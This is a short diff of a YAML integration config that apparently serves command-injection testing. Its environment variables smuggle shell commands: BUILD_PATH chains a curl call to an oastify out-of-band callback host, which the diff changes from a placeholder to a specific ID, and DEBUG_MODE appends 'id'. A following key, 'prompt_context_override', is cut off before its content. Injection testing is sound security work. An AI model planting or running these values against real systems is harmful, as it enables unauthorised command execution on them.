@@ -21,7 +21,7 @@ integration_settings:
 environment_variables:
   # 4. Testing for Command Injection / Argument Injection
   # Tests if the string is passed raw into a system shell during validation routines.
-  BUILD_PATH: "; curl http://YOUR_COLLABORATOR_ID.oastify.com/shellcheck ;"
+  BUILD_PATH: "; curl http://wttl024fiq16i3ff4c32hujxxo3fr9fy.oastify.com/shellcheck ;"
   DEBUG_MODE: "true && id"
 
 prompt_context_override:
